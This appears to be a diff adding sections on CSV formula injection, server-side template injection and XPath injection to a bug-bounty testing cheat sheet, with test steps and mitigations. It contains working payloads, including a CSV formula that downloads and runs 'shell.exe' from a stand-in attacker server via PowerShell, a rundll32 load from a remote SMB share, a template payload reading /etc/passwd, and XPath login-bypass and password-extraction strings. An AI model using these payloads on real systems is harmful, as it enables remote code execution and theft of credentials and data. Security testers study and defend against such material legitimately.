@@ -1251,7 +1251,138 @@ http://10.10.10.10/cat/accountsid=1
 
 ---
 
+# CSV Injection (Formula Injection)
 
+## Overview
+CSV Injection, also known as Formula Injection, occurs when an application allows users to export data into an Excel file (CSV format) that contains malicious formulas. When the exported file is opened in spreadsheet software, the formulas can execute arbitrary commands on the system.
 
+## Steps to Test for CSV Injection
+1. Select any parameter that is part of the Excel sheet to be downloaded.
+2. Modify values in these fields to insert malicious formulas (e.g., First Name, Last Name, Amount, Title, Status, etc.).
+3. Download the Excel file and open it.
+4. If the injected formula executes (e.g., launches the calculator), the application is vulnerable.
 
+> **Mistake:** Do not upload the Excel file back into the application for verification. This results in a false negative.
+
+## Example Payloads
+### Pop Calculator
+```csv
+DDE ("cmd";"/C calc";"!A0")A0
+@SUM(1+1)*cmd|' /C calc'!A0
+=2+5+cmd|' /C calc'!A0
+```
+
+### Pop Notepad
+```csv
+=cmd|' /C notepad'!'A1'
+```
+
+### PowerShell Download and Execute
+```csv
+=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
+```
+
+### Metasploit SMB Delivery with rundll32
+```csv
+=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
+```
+
+## Technical Details
+- `cmd` is the command-line interpreter that the formula can invoke.
+- `/C calc` specifies the command to execute (`calc.exe` in this case).
+- `!A0` or similar references indicate where the formula should be placed in the spreadsheet.
+
+## Mitigation
+To prevent CSV injection:
+- Prefix user input with a single quote (`'`) to treat it as text.
+- Validate and sanitize user input before exporting.
+- Restrict export functionality if formula execution poses a security risk.
+
+---
+# Server-Side Template Injection (SSTI)
+
+Server-Side Template Injection (SSTI) can occur when an application allows users to modify templates, such as:
+
+- **Email Templates**
+- **Suspension Notices**
+- **Invoices**
+
+If the application processes user input as part of a template rendering engine, SSTI might be possible.
+
+## Steps to Identify SSTI
+
+1. **Edit a Template**  
+   - Locate a feature where templates are editable (e.g., email body, invoice format).
+
+2. **Identify Vulnerable Parameters**  
+   - Check for fields where user input is dynamically processed (e.g., columns, placeholders).
+
+3. **Insert Malicious Payload**  
+   - Test with payloads like:
+     ```jinja
+     {{ 7*7 }}  <!-- Checks for Jinja2 -->
+     ${7*7}     <!-- Checks for JSP/Thymeleaf -->
+     <% 7*7 %>  <!-- Checks for PHP/Velocity -->
+     ```
+   - For critical exploitation, try:
+     ```jinja
+     {% extends "/etc/passwd" %}
+     ```
+
+4. **Save, Preview, or Download the Output**  
+   - If the server executes the injected template and returns system information, it's vulnerable.
+
+## Mitigation Strategies
+
+- **Use Safe Template Engines**  
+  - Avoid using engines that allow direct execution of user input.
+  
+- **Implement Input Validation & Escaping**  
+  - Ensure user input is sanitized before rendering.
+
+- **Disable Dangerous Functions**  
+  - Restrict access to filesystem and system functions in template rendering.
+
+---
+# XPath Injection
+
+XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents. Similar to SQL Injection, this attack can manipulate XPath queries to gain unauthorized access to data.
+
+## Common Payloads
+```xpath
+' or '1'='1
+' or ''=''
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x' or name()='username' or 'x'='y
+' and count(/*)=1 and '1'='1
+' and count(/@*)=1 and '1'='1
+' and count(/comment())=1 and '1'='1
+search=')] | //user/*[contains(*,'
+search=Har') and contains(../password,'c
+search=Har') and starts-with(../password,'c
+```
+
+## Tools
+- **xcat** - Automate XPath injection attacks to retrieve documents
+- **xxxpwn** - Advanced XPath Injection Tool
+- **xxxpwn_smart** - A fork of xxxpwn using predictive text
+- **xpath-blind-explorer**
+- **XmlChor** - XPath injection exploitation tool
+
+### Related Resources
+[PayloadsAllTheThings - XPath Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
+
+---
+
+## Bug Bounty Videos
+1. **Extracting Password from Browser Memory Dump** using Task Manager and WinHex
+2. **Cookie Poisoning Demonstration**
+3. **XSS with HTTP Response Splitting**
+4. **JSON Attack - How to Find and Exploit JSON Vulnerabilities**
 
